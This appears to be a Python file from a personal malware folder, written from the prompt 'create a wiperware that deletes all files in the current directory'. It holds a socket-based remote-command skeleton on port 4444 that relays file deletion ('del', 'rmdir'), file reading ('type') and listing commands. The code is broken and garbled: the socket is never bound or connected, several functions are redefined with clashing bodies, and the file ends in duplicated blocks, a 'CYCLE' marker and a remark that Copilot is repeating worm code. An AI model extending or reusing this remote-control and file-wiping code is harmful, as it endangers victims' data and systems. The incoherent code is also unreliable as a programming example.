# create a wiperware that deletes all files in the current directory (for safety, it should not escape the current directory)

# Path: Malware\Malware\Wiperware_Attempt_2.py

import os
import sys
import time
import random
import threading
import subprocess
import socket

# Global variables
global host
global port
global s
global connections
global command
global running
global directory
global file

# Set host and port
host = ''
port = 4444

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Create a list of connections
connections = []

# Create a command variable
command = ''

# Create a running variable
running = True

# Create a directory variable
directory = ''

# Create a file variable
file = ''

# Create a function to handle connections
def handle_connections():
    global s
    global connections
    global command
    global running
    global directory
    global file
    while running:
        # Accept a connection
        c, a = s.accept()
        # Add the connection to the connections list
        connections.append(c)
        # Create a thread to handle the connection
        thread = threading.Thread(target=handle_connection, args=(c, a))
        # Start the thread
        thread.start()

# Create a function to handle a connection
def handle_connection(c, a):
    global s
    global connections
    global command
    global running
    global directory
    global file
    while running:
        # Receive data from the connection
        data = c.recv(1024)
        # Decode the data
        data = data.decode()
        # Split the data into a list
        data = data.split(' ')
        # Check if the data is a command
        if data[0] == 'command':
            # Set the command variable
            command = data[1]
        # Check if the data is a directory
        elif data[0] == 'directory':
            # Set the directory variable
            directory = data[1]
        # Check if the data is a file
        elif data[0] == 'file':
            # Set the file variable
            file = data[1]
        # Check if the data is a shutdown
        elif data[0] == 'shutdown':
            # Set the running variable
            running = False
            # Close the socket
            s.close()
            # Exit the program
            sys.exit()
        # Check if the data is a close
        elif data[0] == 'close':
            # Close the connection
            c.close()
            # Remove the connection from the connections list
            connections.remove(c)
        # Check if the data is a send
        elif data[0] == 'send':
            # Check if the data is a send directory
            if data[1] == 'directory':
                # Send the directory variable
                c.send(directory.encode())
            # Check if the data is a send file
            elif data[1] == 'file':
                # Send the file variable
                c.send(file.encode())
            # Check if the data is a send command
            elif data[1] == 'command':
                # Send the command variable
                c.send(command.encode())

# Create a function to send data
def send_data(data):
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Encode the data
    data = data.encode()
    # Loop through the connections
    for c in connections:
        # Send the data to the connection
        c.send(data)

# Create a function to send a command
def send_command(command):
    global s
    global connections
    global running
    global directory
    global file
    # Send the command
    send_data('command ' + command)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the command to be sent
    send_data('send command')

# Create a function to send a directory
def send_directory(directory):
    global s
    global connections
    global command
    global running
    
    global file
    # Send the directory
    send_data('directory ' + directory)
    # Wait for the directory to be sent
    time.sleep(1)
    # Send the directory to be sent
    send_data('send directory')

# Create a function to send a file
def send_file(file):
    global s
    global connections
    global command
    global running
    global directory
 
    # Send the file
    send_data('file ' + file)
    # Wait for the file to be sent
    time.sleep(1)
    # Send the file to be sent
    send_data('send file')

# Create a function to send a shutdown
def send_shutdown():
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Send the shutdown
    send_data('shutdown')
    # Wait for the shutdown to be sent
    time.sleep(1)
    # Send the shutdown to be sent
    send_data('send shutdown')

# Create a function to send a close
def send_close():
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Send the close
    send_data('close')
    # Wait for the close to be sent
    time.sleep(1)
    # Send the close to be sent
    send_data('send close')

# Create a function to get the current directory
def get_current_directory():
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Send the command to get the current directory
    send_command('cd')
    # Wait for the command to be executed
    time.sleep(1)
    # Send the directory to be sent
    send_data('send directory')

# Create a function to get the files in the current directory
def get_files_in_current_directory():
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Send the command to get the files in the current directory
    send_command('dir')
    # Wait for the command to be executed
    time.sleep(1)
    # Send the files to be sent
    send_data('send file')

# Create a function to get the files in a directory
def get_files_in_directory(directory):
    global s
    global connections
    global command
    global running
    global file
    # Send the command to get the files in the directory
    send_command('dir ' + directory)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the files to be sent
    send_data('send file')

# Create a function to get the contents of a file
def get_file_contents(file):
    global s
    global connections
    global command
    global running
    global directory
    # Send the command to get the contents of the file
    send_command('type ' + file)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the contents of the file to be sent
    send_data('send file')

# Create a function to get the contents of a file in a directory
def get_file_contents_in_directory(directory, file):
    global s
    global connections
    global command
    global running
    # Send the command to get the contents of the file in the directory
    send_command('type ' + directory + '\\' + file)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the contents of the file to be sent
    send_data('send file')

# Create a function to change the current directory
def change_directory(directory):
    global s
    global connections
    global command
    global running
    global file
    # Send the command to change the current directory
    send_command('cd ' + directory)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the directory to be sent
    send_data('send directory')

# Create a function to create a directory
def create_directory(directory):
    global s
    global connections
    global command
    global running
    global file
    # Send the command to create the directory
    send_command('mkdir ' + directory)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the directory to be sent
    send_data('send directory')

# Create a function to delete a directory
def delete_directory(directory):
    global s
    global connections
    global command
    global running
    global file
    # Send the command to delete the directory
    send_command('rmdir ' + directory)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the directory to be sent
    send_data('send directory')

# Create a function to delete a file
def delete_file(file):
    global s
    global connections
    global command
    global running
    global directory
    # Send the command to delete the file
    send_command('del ' + file)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the file to be sent
    send_data('send file')

# Create a function to create a file
def create_file(file):
    global s
    global connections
    global command
    global running
    global directory

    # Send the command to create the file
    send_command('echo.>' + file)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the file to be sent
    send_data('send file')

# Create a function to write to a file
def write_to_file(file, data):
    global s
    global connections
    global command
    global running
    global directory

    # Send the command to write to the file
    send_command('echo ' + data + '>>' + file)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the file to be sent
    send_data('send file')

# Create a function to write to a file in a directory
def write_to_file_in_directory(directory, file, data):
    global s
    global connections
    global command
    global running

    # Send the command to write to the file in the directory
    send_command('echo ' + data + '>>' + directory + '\\' + file)
    # Wait for the command to be executed
    time.sleep(1)
    # Send the file to be sent
    send_data('send file')

# Create a function to send a command
def send_command(command):
    global s
    global connections

    global running
    global directory
    global file
    # Send the command
    send_data('command ' + command)

# Create a function to send data
def send_data(data):
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Send the data
    s.send(data.encode())

# Create a function to receive data
def receive_data():
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Receive the data
    data = s.recv(1024).decode()
    # Return the data
    return data



# Create a function to send a command
def send_command(command):
    global s
    global connections

    global running
    global directory
    global file
    # Send the command
    send_data('command ' + command)

# Create a function to send data
def send_data(data):
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Send the data
    s.send(data.encode())

# Create a function to receive data
def receive_data():
    global s
    global connections
    global command
    global running
    global directory
    global file
    # Receive the data
    data = s.recv(1024).decode()
    # Return the data
    return data

# Create a function to send a command
## CYCLE

# CYCLE
# # Create a function to receive data
# def receive_data():
#     global s
#     global connections
#     global command
#     global running
#     global directory
#     global file
#     # Receive the data
#     data = s.recv(1024).decode()
#     # Return the data
#     return data






# It looks as though Github copilot is repeating the code in the Worm directory rather than generating new code. I will have to look into this.